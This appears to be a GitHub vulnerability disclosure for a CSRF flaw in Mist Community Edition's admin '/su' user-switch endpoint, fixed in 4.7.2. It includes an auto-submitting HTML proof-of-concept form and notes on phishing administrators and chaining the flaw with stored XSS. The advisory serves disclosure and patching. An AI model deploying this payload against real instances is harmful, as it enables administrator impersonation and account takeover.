# Cross-Site Request Forgery (CSRF) in Admin's Switch User Operation

<table>
  <tr>
    <td width="150" rowspan="2">
      <a href="https://github.com/mistio/mist-ce" target="_blank">
        <img src="https://avatars.githubusercontent.com/u/1569127?s=200&v=4" alt="Summer Pearl Logo" width="120"/>
      </a>
    </td>
    <td>
      <h1>Mist Community Edition</h1>
      <h3> An Open-Source Multicloud Management Platform</h3>
    </td>
  </tr>
  <tr>
    <td>
      <table>
        <tr>
          <td>
            🔗 <a href="https://github.com/mistio/mist-ce" target="_blank">Mist Github Repository</span></a>
          </td>
          <td style="padding-left: 15px;">
            🚀 <a href="https://github.com/mistio/mist-ce/releases/tag/v4.7.2" target="_blank"> Patched Version (v4.7.2) </span></a>
          </td>
        </tr>
      </table>
    </td>
  </tr>
</table>

## 📜 Description
Mist Community Edition (CE) versions prior to 4.7.2 fail to implement CSRF protection for the administrator user-switching functionality ("/su" endpoint). This allows attackers to force administrators into unintended account contexts by visiting a malicious page. While the direct impact is limited to account impersonation, this vulnerability can be chained with other flaws (e.g., XSS) to escalate attacks. The issue was addressed in version 4.7.2.

## 🔍 Affected Versions

| Status       | Version         |
|--------------|-----------------|
| 🔴 Vulnerable |  ≤ `4.7.1`      |
| 🟢  Fixed     |  &nbsp;&nbsp;`4.7.2`      | 

## ⚠️ Disclaimer
This project is intended for **educational and ethical research purposes only**. Unauthorized testing on systems without explicit permission is illegal. Use responsibly and only on systems you own or have permission to test.

## 💻 Exploit Details

### 🔹 **CSRF Exploitation**
An attacker can exploit this vulnerability by phishing or tricking an administrator into visiting a malicious webpage. The crafted form sends a POST request to the vulnerable `/su?email=<user email>` endpoint, impersonating a specified user and performing actions on their behalf. This could lead to:
- **Unauthorized administrative actions**
- **Sensitive information disclosure**
- **Session hijacking**

### 🔹 **Chaining with Other Vulnerabilities**
This vulnerability can be combined with other weaknesses, such as the **Stored XSS** in the tag field, to further escalate attacks, potentially leading to **account takeover**.

## 🛠️ Steps to Reproduce

### 1️⃣ Craft Malicious HTML Form
Create a malicious HTML form designed to impersonate a specific user (e.g., `v@victim.com`). Here’s an example of the malicious form:
```html
<html>
  <body>
    <form action="http://192.168.1.5/su">
      <input type="hidden" name="email" value="v@victim.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState(‘’, ‘’, ‘/’);
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### 2️⃣ Send Malicious Form to Administrator
- The attacker sends this crafted page to an administrator (e.g., via phishing or other social engineering techniques).
  
### 3️⃣ Administrator Visits Malicious Page
- Upon visiting the page, the form automatically submits, and the administrator is tricked into performing a user switch, impersonating the attacker’s specified user.
  
### 4️⃣ Exploiting the Admin's Session
- The admin unknowingly executes the malicious request, performing actions on behalf of the impersonated user.

## 🎬 Demonstration Video
<a href="https://youtu.be/M3AQ67t3ths" target="_blank">
  <img src="https://img.youtube.com/vi/M3AQ67t3ths/maxresdefault.jpg" width="700" height="380"/>
</a>

## 🧑‍💻 Discovery

This vulnerability was discovered by **Alex Perrakis** (Stolichnayer).

## 🔗 References:
- [Mist CE Github Repository](https://github.com/mistio/mist-ce)
- [Patched Version (v4.7.2)](https://github.com/mistio/mist-ce/releases/tag/v4.7.2)
- [Fix Commit](https://github.com/mistio/mist.api/commit/db10ecb62ac832c1ed4924556d167efb9bc07fad)
